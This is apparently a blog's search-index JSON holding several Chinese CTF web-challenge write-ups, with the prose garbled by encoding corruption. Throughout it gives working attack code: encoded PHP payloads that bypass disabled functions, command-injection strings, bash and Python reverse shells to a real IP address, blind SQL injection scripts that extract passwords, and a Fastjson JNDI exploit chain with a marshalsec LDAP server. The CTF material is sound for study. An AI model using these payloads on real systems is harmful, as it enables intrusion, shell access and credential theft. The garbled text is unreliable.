12http:&#x2F;&#x2F;0f224c84-f3b8-42e4-9dd3-755cd38520eb.node3.buuoj.cn&#x2F;?_&#x3D;(~%8F%97%8F%96%91%99%90)(); è¿™æ ·å°±æˆåŠŸäº†,æŸ¥ä¸€ä¸‹disablefunctionï¼Œ 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,escapeshellarg,escapeshellcmd,passthru,proc_close,proc_get_status,proc_open,shell_exec,mail,imap_open, æ‰€æœ‰å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°éƒ½è¢«banäº†ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æœ‰PHPçš„åŸç”Ÿå‡½æ•°:scan_dirå’Œglobï¼Œè¯»å–æ–‡ä»¶çš„è¯å¯ä»¥ç”¨highlight_file()å’Œreadfile 123æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤å¦‚ä¸‹ï¼šprint_r(scandir(.));show_source(end(scandir(.))); åˆ†åˆ«å¾—å‡ºpayloadï¼š 1((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)); 1((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"å‘½ä»¤æ‰§è¡Œ","slug":"å‘½ä»¤æ‰§è¡Œ","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"GYCTF2020_EasyThinking","slug":"GYCTF2020-EasyThinking","date":"2021-03-25T09:14:24.000Z","updated":"2021-03-25T09:22:18.413Z","comments":true,"path":"2021/03/25/GYCTF2020-EasyThinking/","link":"","permalink":"http://example.com/2021/03/25/GYCTF2020-EasyThinking/","excerpt":"","text":"www.zip å¯ä»¥ä¸‹è½½æºç  è¿›å»å…ˆçœ‹ç‰ˆæœ¬ï¼Œå‘ç°æ˜¯thinkphp6.0ï¼Œæœä¸€ä¸‹CVEï¼Œå‘ç°æœ‰è¿™ä¹ˆä¸€ä¸ªæ¼æ´ 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;god_zzZ&#x2F;article&#x2F;details&#x2F;104275241?utm_medium&#x3D;distribute.pc_relevant.none-task-blog-baidujs_title-1&amp;spm&#x3D;1001.2101.3001.4242 çœ‹äº†çœ‹session.phpçš„ï¼Œå—¯ï¼Œæœç„¶æ»¿è¶³åˆ©ç”¨æ¡ä»¶çš„ç¯å¢ƒ é‚£ä¹ˆæ ¹æ®ä½œè€…ç»™å‡ºçš„æ¡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦å†æ‰¾ä¸€ä¸ªåœ°æ–¹ï¼Œåˆ©ç”¨åˆ°äº†sessionå‡½æ•°ä¸”å€¼å¯æ§ï¼Œå¾ˆå¿«å°±å¯ä»¥æ‰¾åˆ°å†è¿™é‡Œï¼š é‚£ä¹ˆåˆ©ç”¨ä¹Ÿå¾ˆç®€å•äº†ï¼Œæ ¹æ®ç»™å‡ºçš„åˆ©ç”¨æ–¹å¼æ„é€ å³å¯ï¼š ä¹‹åçš„ç»•è¿‡é™åˆ¶å¯ä»¥ç”¨èšå‰‘ä¸€é”®è·‘å°±è¡Œã€‚","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"CVE","slug":"CVE","permalink":"http://example.com/tags/CVE/"},{"name":"ThinkPHP","slug":"ThinkPHP","permalink":"http://example.com/tags/ThinkPHP/"}]},{"title":"nepctfå¤ç°","slug":"nepctfå¤ç°","date":"2021-03-24T11:05:34.000Z","updated":"2021-03-25T06:19:42.676Z","comments":true,"path":"2021/03/24/nepctfå¤ç°/","link":"","permalink":"http://example.com/2021/03/24/nepctf%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"Little_trickè¿™é“é¢˜ç›®é™åˆ¶çš„å¾ˆæ­»ï¼Œä½†æ˜¯è¿™ç§é¢˜ç›®ä¹‹å‰å°±åšè¿‡äº†ï¼Œå¯ä»¥é€šè¿‡å†™å…¥æ–‡ä»¶çš„æ–¹å¼æ¥è¯»å–flagçš„ ã€‚ 1234567891011&lt;?php error_reporting(0); highlight_file(__FILE__); $nep = $_GET[&#x27;nep&#x27;]; $len = $_GET[&#x27;len&#x27;]; if(intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13)&#123; eval(substr($nep,0,$len)); &#125;else&#123; die(&#x27;too long!&#x27;); &#125;?&gt; æ•…é€šè¿‡ï¼š 123?nep&#x3D;&#96;ls&gt;z&#96;;&amp;len&#x3D;7?nep&#x3D;&#39;&gt;cat&#39;;&amp;len&#x3D;7?nep&#x3D;&#39;*&gt;z&#39;;&amp;len&#x3D;7 è¿™é‡Œè¿˜æœ‰ç¬¬äºŒä¸ªè§£ï¼š 123456789101112?nep&#x3D;&#96;$nep&#96;;ls&gt;z&amp;len&#x3D;7?nep&#x3D;&#96;$nep&#96;;&gt;cat&amp;len&#x3D;7?nep&#x3D;&#96;$nep&#96;;*&gt;z&amp;len&#x3D;7?nep&#x3D;&#96;$nep&#96;;ls&gt;z&amp;len&#x3D;7 &#x2F;&#x2F; å¾—åˆ°ç›®å½•ä¸‹æ–‡ä»¶å?nep&#x3D;&#96;$nep&#96;;&gt;cat&amp;len&#x3D;7&#x2F;&#x2F; ç”Ÿæˆæ–‡ä»¶åä¸ºcatçš„æ–‡ä»¶?nep&#x3D;&#96;$nep&#96;;*&gt;z&amp;len&#x3D;7è¾“å…¥é€šé…ç¬¦*ï¼ŒLinuxä¼šæŠŠç¬¬ä¸€ä¸ªåˆ—å‡ºçš„æ–‡ä»¶åå½“ä½œå‘½ä»¤ï¼Œå‰©ä¸‹çš„æ–‡ä»¶åå½“ä½œå‚æ•°ã€‚æœ€åè®¿é—®æ–‡ä»¶zå³å¯ã€‚ è¿™é‡Œå…¶å®len=7èƒ½åšå‡ºæ¥åº”è¯¥å¹¶éæ˜¯å‡ºé¢˜äººçš„æœ¬æ„¿ï¼Œå®é™…ä¸Šå‡ºé¢˜äººåº”è¯¥æ˜¯æƒ³è®©äººä»¤len=-1 åœ¨phpä¸­çš„æµ‹è¯•ï¼š è§£æ³•ä¸‰æ²¡è§è¿‡ï¼š 12345678910111213141516171819202122232425262728293031# -*- coding: UTF-8 -*-import requestsp = r&#x27;&#x27;&#x27;&gt;hp&gt;1.p\\\\&gt;d\\&gt;\\\\&gt;\\ -\\\\&gt;e64\\\\&gt;bas\\\\&gt;7\\|\\\\&gt;XSk\\\\&gt;Fsx\\\\&gt;dFV\\\\&gt;kX0\\\\&gt;bCg\\\\&gt;XZh\\\\&gt;AgZ\\\\&gt;waH\\\\&gt;PD9\\\\&gt;o\\ \\\\&gt;ech\\\\ls -t&gt;0sh 0&#x27;&#x27;&#x27;url = &quot;http://192.168.130.128:10110/47c87ab02c7cac57165d0c568f0542bc/?nep=&#123;&#125;&amp;len=-1&quot;print(&quot;[+]start attack!!!&quot;)for i in p.split(&#x27;\\n&#x27;): print(i) payload = &#x27;`&#x27; + i.strip() + &#x27;`;;&#x27; print(&quot;[*]&quot; + url.format(payload)) requests.get(url.format(payload)) é€šè¿‡æ³¨å…¥çš„æ–¹å¼æŠŠæ–‡ä»¶å†™è¿›å» è§£æ³•4æ›´åŠ æ˜“æ‡‚ï¼š 1?nep&#x3D;&#96;$_GET[1]&#96;;;&amp;len&#x3D;-1&amp;1&#x3D;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;10110 0&gt;&amp;1 easy_tomcatè·ŸVNCTFå“ªä¸ªä¸€æ ·ï¼Œä½†æ˜¯è¿™é‡Œå’‹éƒ½å¼¹ä¸å‡ºæ¥ï¼Œå…ˆpass bbxhh_revengeè¿™é¢˜å‰é¢æ„Ÿè§‰å°±æ˜¯ğŸ¤¢ æœ€åä¸€æ­¥è¿™é‡Œæ„Ÿè§‰è¿˜æ˜¯ç›¸å½“æœ‰è¶£çš„ 1234567891011121314151617181920212223242526&lt;?phpfunction waf($s)&#123; return preg_replace(&#x27;/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\\/\\/|&gt;/i&#x27;, &quot;NepnEpneP&quot;, $s);&#125;if(isset($_GET[&#x27;a&#x27;]))&#123; $_ = waf($_GET[&#x27;a&#x27;]); $__ = waf($_GET[&#x27;b&#x27;]); $a = new $_($__);&#125;else&#123; $a = new Error(&#x27;?&#x27;);&#125;if(isset($_GET[&#x27;c&#x27;]) &amp;&amp; isset($_GET[&#x27;d&#x27;]))&#123; $c = waf($_GET[&#x27;c&#x27;]); $d = waf($_GET[&#x27;d&#x27;]); eval(&quot;\\\\$a-&gt;$c($d);&quot;);&#125;else&#123; $c = &quot;getMessage&quot;; $d = &quot;&quot;; eval(&quot;echo \\\\$a-&gt;$c($d);&quot;);&#125; å‡ºé¢˜äººè¯´æ˜¯è€ƒå¯Ÿäº†åŸç”Ÿåå°„çš„æœºåˆ¶ï¼ˆæ„Ÿè§‰è¿™æ®µæ—¶é—´å…¨éƒ½æ˜¯PHPåŸç”Ÿç±»ï¼Ÿï¼‰ï¼Œå¯ä»¥å»æœä¸€ä¸‹ReflectionFunctionç±»ï¼Œåˆ©ç”¨invokArgsæ“ä½œï¼Œå®é™…ä¸Šå°±ç›¸å½“äºä½¿ç”¨äº†call_usr_func å‡ºé¢˜äººçš„payloadï¼š 1index.php?a=ReflectionFunction&amp;b=call_user_func&amp;c=invokeArgs&amp;d=array(%27assert%27,%27s%27.%27how_source(\\%27/f\\%27.\\%27lag\\%27)%27) æ„Ÿè§‰è‡ªå·±æ€»æ˜¯ä¸å¤ªæ˜ç™½call_user_funcèƒ½åšä»€ä¹ˆï¼Œè¿™é‡Œæ€»ç»“ä¸€ä¸‹ï¼š é¦–å…ˆä¹¦å†™ä¾‹å­ï¼š 12345&lt;?php$a = $_GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];echo call_user_func($a,$b); ç»è¿‡æµ‹è¯•ï¼Œcall_user_func å¸¸ç”¨çš„å‡½æ•°å¦‚ä¸‹ï¼š 1.file_get_contentsè¿™ä¸ªå€’æ˜¯å¾ˆå¥½ç†è§£ï¼š ä½†æ˜¯åŒæ—¶è¦æ³¨æ„çš„æœ‰å¦‚ä¸‹ç»†èŠ‚ï¼š 1.è¯¥å‡½æ•°å…è®¸ä½¿ç”¨ä¼ªåè®® 2.è¯¥å‡½æ•°å…è®¸file://åè®®ç­‰ç­‰ï¼Œæ‰€ä»¥ä½ å¯ä»¥è¿™æ ·æ“ä½œï¼š è‚¯å®šä¹Ÿæ”¯æŒhttpåè®®çš„å•¦ ä½†æ˜¯è¦æ³¨æ„ï¼Œfile_get_contentsè¯¥å‡½æ•°å¹¶ä¸ä¼šè‡ªå¸¦å›æ˜¾ï¼Œæ‰€ä»¥è¯¥å‡½æ•°åªèƒ½ç”¨äºä½¿ç”¨æœ‰è¾“å‡ºçš„æƒ…å†µ 2.assert 7.0ç‰ˆæœ¬æ‰å¯ä»¥ä½¿ç”¨å¯ä»¥ç›´æ¥å‘½ä»¤æ‰§è¡Œï¼Œæ„Ÿè§‰æ²¡å•¥å¥½è¯´çš„ 3.systemå¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤äº†ï¼Œä½†æ˜¯æ„Ÿè§‰å¤§éƒ¨åˆ†æƒ…å†µä¹Ÿä¼šè¢«banæ‰ï¼Œä½†æ˜¯awdè¯´ä¸å®šç”¨å¾—ä¸Šå‘¢ 4.execå’Œsystemæ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯éœ€è¦æ‰‹åŠ¨çš„è¾“å‡ºå‡ºæ¥ 5.shell_execå’ŒexecåŒç†ï¼Œä½†æ˜¯ä¸¤è€…ä¹‹é—´åˆæœ‰åŒºåˆ«ã€‚é¦–å…ˆä¸¤è€…éƒ½éœ€è¦echo çš„è¾“å‡ºï¼Œä½†æ˜¯shell_execçš„èµ·ç‚¹å°±æ˜¯å½“å‰ç›®å½•ï¼Œè€Œexecçš„èµ·ç‚¹ä¸ºä¹‹å‰çš„ç›®å½•ï¼Œæ•…ä¸¤è€…é—´è¿˜æ˜¯æœ‰åŒºåˆ«çš„ 6.passthruå¯ä»¥ç”¨äºè¯»å–å›¾ç‰‡ï¼Ÿ ä¸éœ€è¦echoè‡ªå·±å°±æœ‰å›æ˜¾äº† 7.pcntl_execä¸æ˜¯å¾ˆå¥½ç”¨ï¼Œè¿™ä¸ªéœ€è¦æ‰§è¡Œå‚æ•°æ‰§è¡Œå‘½ä»¤ï¼Œä¾‹å­ï¼š 1234567&lt;?php pcntl_exec(â€œ/bin/bashâ€, array(â€œ/tmp/b4dboy.shâ€));?&gt;#/tmp/b4dboy.sh#!/bin/bashls -l / ä½†æ˜¯è¯¥å‡½æ•°åœ¨7.0å·²ç»é»˜è®¤è¢«banæ‰äº†æ‰€ä»¥å¹¶ä¸å¥½ç”¨ å…¶ä»–å‡½æ•°å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼š 12345ob_start()ã€unserialize()ã€creat_function()usort()ã€uasort()ã€uksort()array_filter()array_reduce()array_map()","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"},{"name":"FastJson","slug":"FastJson","permalink":"http://example.com/tags/FastJson/"}]},{"title":"vnctf","slug":"vnctf","date":"2021-03-23T10:14:40.000Z","updated":"2021-03-23T12:15:12.177Z","comments":true,"path":"2021/03/23/vnctf/","link":"","permalink":"http://example.com/2021/03/23/vnctf/","excerpt":"","text":"VNCTF çš„åˆ·é¢˜è®°å½• HappyCTFdä¸€ä¸ªCVEçš„å¤åŸCVE-2020-7245ï¼Œæ²¡æœ‰ä»€ä¹ˆå¥½è¯´çš„ CHECKINè¿™ä¸ªé¢˜ç›®ç®—æ¯”è¾ƒç®€å•å˜ï¼Œ é¢˜ç›®ç»™å‡ºæºç ï¼š 12345678910111213141516171819202122232425262728from flask import Flask, requestimport osapp = Flask(__name__)flag_file = open(&quot;flag.txt&quot;, &quot;r&quot;)# flag = flag_file.read()# flag_file.close()## @app.route(&#x27;/flag&#x27;)# def flag():# return flag## want flag? naive!# You will never find the thing you want:) I think@app.route(&#x27;/shell&#x27;)def shell(): os.system(&quot;rm -f flag.txt&quot;) exec_cmd = request.args.get(&#x27;c&#x27;) os.system(exec_cmd) return &quot;1&quot;@app.route(&#x27;/&#x27;)def source(): return open(&quot;app.py&quot;,&quot;r&quot;).read()if __name__ == &quot;__main__&quot;: app.run(host=&#x27;0.0.0.0&#x27;) å¯ä»¥çœ‹è§shellçš„partå»æ‰§è¡Œå‘½ä»¤äº†ã€‚ç›´æ¥åå¼¹shell 1shell?c=python3 -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;81.69.201.65&#x27;,8002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot; è¿™é‡Œæœ‰ä¸€ä¸ªtrickï¼Œå°±æ˜¯å½“Pythonå¤„ç†æ–‡ä»¶çš„æ—¶å€™ï¼Œè‹¥ä»…ä»…æ˜¯openå´æ²¡æœ‰closeæµçš„è¯ï¼Œè¿˜æ˜¯å¯ä»¥é€šè¿‡procä¸‹è¯»å–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å†æ¬¡æ‰§è¡Œå‘½ä»¤ 1cat &#x2F;proc&#x2F;*&#x2F;fd&#x2F;* å³å¯ã€‚ TimeTravelå­¦åˆ°äº†..æ·±æ„Ÿè‡ªå·±å¯¹äºHTTPå’ŒNCçš„äº†è§£ä¸è¶³ 12345678910111213141516171819202122232425&lt;?phperror_reporting(0);require __DIR__ . &#x27;/vendor/autoload.php&#x27;;use GuzzleHttp\\Client;highlight_file(__FILE__);if(isset($_GET[&#x27;flag&#x27;])) &#123; $client = new Client(); $response = $client-&gt;get(&#x27;http://127.0.0.1:5000/api/eligible&#x27;); $content = $response-&gt;getBody(); $data = json_decode($content, TRUE); if($data[&#x27;success&#x27;] === true) &#123; echo system(&#x27;/readflag&#x27;); &#125;&#125;if(isset($_GET[&#x27;file&#x27;])) &#123; highlight_file($_GET[&#x27;file&#x27;]);&#125;if(isset($_GET[&#x27;phpinfo&#x27;])) &#123; phpinfo();&#125; ä¸€å¼€å§‹çœ‹è§æœ‰ä¸ªä»»æ„æ–‡ä»¶è¯»å–æˆ‘å°±åœ¨é‚£çŒ›è¯»ï¼Œç»“æœå•¥ä¹Ÿæ²¡æœ‰ï¼Œåæ¥æ‰çŸ¥é“æ˜¯GuzzleHttpçš„æ¼æ´ï¼Œæ–‡ç« å‡ºå¤„ï¼š 1https:&#x2F;&#x2F;www.laruence.com&#x2F;2016&#x2F;07&#x2F;19&#x2F;3101.html åœ¨æ–‡ç« å½“ä¸­æˆ‘ä»¬å°±å¯ä»¥çœ‹è§ä½œè€…è¯´åˆ°ï¼š æ‰€ä»¥ï¼Œ è¿™ä¸ªæ¼æ´è¦å½±å“ä½ ï¼Œ æœ‰å‡ ä¸ªæ ¸å¿ƒå‰ææ˜¯: ä½ çš„æœåŠ¡ä¼šå¯¹å¤–è¯·æ±‚èµ„æº ä½ çš„æœåŠ¡ä½¿ç”¨äº†HTTP_PROXY(å¤§å†™çš„)ç¯å¢ƒå˜é‡æ¥ä»£ç†ä½ çš„è¯·æ±‚ï¼ˆå¯èƒ½æ˜¯ä½ è‡ªå·±å†™ï¼Œæˆ–æ˜¯ä½¿ç”¨ä¸€äº›æœ‰ç¼ºé™·çš„ç±»åº“ï¼‰ ä½ çš„æœåŠ¡è·‘åœ¨PHPçš„CGIæ¨¡å¼ä¸‹(cgi, php-fpm) é‚£ä¹ˆå…ˆçœ‹phpinfoï¼Œç¡®å®è¿è¡Œæ‰CGIæ¨¡å¼ä¸‹ï¼Œä¹‹åå†çœ‹ç¯å¢ƒä»£ç†ï¼Œä½œè€…æ¸…æ¥šçš„å†™å‡ºäº†http_proxyçš„Guzzleæœ‰ç¼ºé™·ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ–‡ç« ä¸­ä½œè€…ç»™å‡ºçš„å§¿åŠ¿ï¼š æˆ‘ä»¬åˆ©ç”¨ncå°±å¯ä»¥æ“ä½œåˆ°ï¼Œå…ˆç›‘å¬ï¼Œä¹‹åä¼ªé€ ä¸€ä¸ªè®¿é—®çš„ä¿¡æ¯å³å¯ 12345678HTTP/1.1 200 OKServer: nginx/1.14.2Date: Sat, 29 Feb 2020 05:27:31 GMTContent-Type: text/html; charset=UTF-8Connection: Keep-aliveContent-Length: 16&#123;&quot;success&quot;:&quot;true&quot;&#125;","categories":[],"tags":[]},{"title":"VNCTF_2021_realezjvav","slug":"VNCTF-2021-realezjvav","date":"2021-03-22T12:58:52.000Z","updated":"2021-03-25T06:48:40.737Z","comments":true,"path":"2021/03/22/VNCTF-2021-realezjvav/","link":"","permalink":"http://example.com/2021/03/22/VNCTF-2021-realezjvav/","excerpt":"","text":"sqlæ³¨å…¥è¿™é‡Œä¸æ˜¯æˆ‘æƒ³å­¦ä¹ çš„é‡ç‚¹ï¼Œæ•…ç›´æ¥ç”©ä¸€ä¸ªç¬›å¡å°”ç§¯çš„è„šæœ¬ 123456789101112131415161718192021222324252627import requestsfrom time import *url=&quot;http://73b041f1-d05e-451c-8ef9-eeda4da6ab8e.node3.buuoj.cn/user/login&quot;flag=&quot;&quot;for i in range(1,100): min=32 max=128 while 1: j=min+(max-min)//2 if j==min: flag+=chr(j) print(flag) break payload=&quot;-1&#x27;or if(ascii(substr(password,&#123;&#125;,1))&lt;&#123;&#125;,(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.tables C),1)#&quot;.format(i,j) data=&#123; &#x27;username&#x27;:&#x27;admin&#x27;, &#x27;password&#x27;:payload &#125; try: r=requests.post(url=url,data=data,timeout=0.7) min=j except: max=j sleep(0.4) æˆ–è€…è¿™ä¸ªï¼š 123456789101112131415161718192021222324252627282930313233343536import requestsurl=&quot;http://c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login&quot;flag=&#x27;&#x27;for i in range(1,50): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 # p1=&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&#x27;user&#x27;),&#123;&#125;,1))=&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;.format(i,mid) # p2=&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&#x27;user&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;.format(i,mid) p1=&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(password)/**/from/**/user),&#123;&#125;,1))=&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;.format(i,mid) p2=&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(password)/**/from/**/user),&#123;&#125;,1))&gt;&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;.format(i,mid) data1=&#123;&#x27;username&#x27;:&#x27;admin&#x27;,&#x27;password&#x27;:p1&#125; data2=&#123;&#x27;username&#x27;:&#x27;admin&#x27;,&#x27;password&#x27;:p2&#125; try: print(i,mid) r1=requests.post(url,data=data1,timeout=1) except requests.exceptions.ReadTimeout as e: flag+=chr(mid) print(flag) break except Exception as e: pass else: try: r2=requests.post(url,data=data2,timeout=1) except requests.exceptions.ReadTimeout as e: low=mid+1 except Exception as e: pass else: top=mid-1 if flag==f1: break å¾—åˆ°å¯†ç ï¼Œå¾—åˆ°ä¸Šå»ä¹‹åå¯ä»¥åˆ›å»ºç”¨æˆ·ï¼š å‘ç°æºç ï¼š 123456789101112131415161718192021//æäº¤jsonæ•°æ®function send() &#123; var jsonStr = &#123; &quot;name&quot; : $(&#x27;#se1&#x27;).val() &#125;; $.ajax(&#123; //å‡ ä¸ªå‚æ•°éœ€è¦æ³¨æ„ä¸€ä¸‹ type: &quot;POST&quot;,//æ–¹æ³•ç±»å‹ dataType:&quot;text&quot;, contentType: &quot;application/x-www-form-urlencoded;charset=utf-8&quot;,//é¢„æœŸæœåŠ¡å™¨è¿”å›çš„æ•°æ®ç±»å‹ url: &quot;/create&quot; ,//url data:&#123;&quot;roleJson&quot;:JSON.stringify(jsonStr)&#125;, success: function (result) &#123; resObj = eval(&quot;(&quot;+result+&quot;)&quot;); $(&quot;#roleText&quot;).html(&quot;&lt;span&gt;&quot;+resObj.hello+&quot;&lt;/span&gt;&quot;); $(&quot;#roleImg&quot;).html(&#x27;&lt;img style=&quot;width:180px;height:180px&quot; src=&quot;/searchimage?img=&#x27;+resObj.number +&#x27;.png&quot;/&gt;&#x27;) &#125;, error : function() &#123; console.log(&quot;è¿è¡Œå¼‚å¸¸&quot;); &#125; &#125;);&#125; å°è¯•è¯»å–æ–‡ä»¶ï¼š javaçš„é¢˜ç›®ï¼Œå¤šåŠæ˜¯fastjsonå‡ºé—®é¢˜äº†ï¼Œçœ‹ä¸‹ç‰ˆæœ¬ fastjsonèµ·æœåŠ¡è¿™é‡Œå†™ç»™è‡ªå·±ç”¨äºè®°å½•ï¼Œå…´è®¸åˆ«äººç¬¬ä¸€æ¬¡ä¹Ÿä¼šç”¨å¾—åˆ°ï¼Œé¦–å…ˆåœ¨æ–°å»ºä¸€ä¸ªExploit.java ,ä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516public class Exploit &#123; public Exploit() &#123; try &#123; Runtime.getRuntime().exec( &quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzgxLjY5LjIwMS42NS84MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public static void main(String[] argv) &#123; Exploit e = new Exploit(); &#125;&#125; æ‰§è¡Œå‘½ä»¤ï¼š 1javac Exploit.java å¾—åˆ°æ–‡ä»¶Exploit.class,åœ¨å½“å‰æ–‡ä»¶ä¸‹è¾“å…¥æŒ‡ä»¤ï¼Œ 1python -m http.server 8002 æˆåŠŸä¹‹ååº”è¯¥åƒè¿™æ ·ï¼š å†ä¹‹åä¸‹è½½marshalsec-masterï¼Œå®‰è£…å®Œæˆä¹‹åå»targetç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤ï¼š 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://81.69.201.65:8002/#Exploit å†ä¹‹åæ‰“payloadå°±å¥½ï¼š 12&#123;&quot;name&quot;:&#123;&quot;\\u0040\\u0074\\u0079\\u0070\\u0065&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c&quot;&#125;,&quot;x&quot;:&#123;&quot;\\u0040\\u0074\\u0079\\u0070\\u0065&quot;:&quot;\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c&quot;,&quot;dataSourceName&quot;:&quot;ldap://81.69.201.65:1389/Exploit&quot;,&quot;\\u0061\\u0075\\u0074\\u006f\\u0043\\u006f\\u006d\\u006d\\u0069\\u0074&quot;:true&#125;&#125;&#125;","categories":[],"tags":[{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java","slug":"java","permalink":"http://example.com/tags/java/"},{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"Easy_Tomcat","slug":"Easy-Tomcat","date":"2021-03-22T03:18:00.000Z","updated":"2021-03-22T12:58:20.943Z","comments":true,"path":"2021/03/22/Easy-Tomcat/","link":"","permalink":"http://example.com/2021/03/22/Easy-Tomcat/","excerpt":"","text":"æ²¡åšè¿‡javaé¢˜ç›®","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"},{"name":"Tomcat","slug":"Tomcat","permalink":"http://example.com/tags/Tomcat/"},{"name":"FastJson","slug":"FastJson","permalink":"http://example.com/tags/FastJson/"}]},{"title":"nepctf_æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­","slug":"nepctf-æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­","date":"2021-03-22T02:41:19.000Z","updated":"2021-03-22T03:11:17.071Z","comments":true,"path":"2021/03/22/nepctf-æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­/","link":"","permalink":"http://example.com/2021/03/22/nepctf-%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD/","excerpt":"","text":"ä¸€é“è€ƒç‚¹æ¯”è¾ƒæœ‰è¶£çš„é¢˜ç›®ï¼Œè™½ç„¶ä¸éš¾è€Œä¸”æœ‰ç‚¹ç»•ï¼Œä½†æ˜¯æ„Ÿè§‰æ€è·¯è¿˜æ˜¯å¾ˆç²¾å¦™çš„ï¼ é¦–å…ˆæ‰“å¼€é¢˜ç›®å¯ä»¥çœ‹åˆ°æºç ï¼š 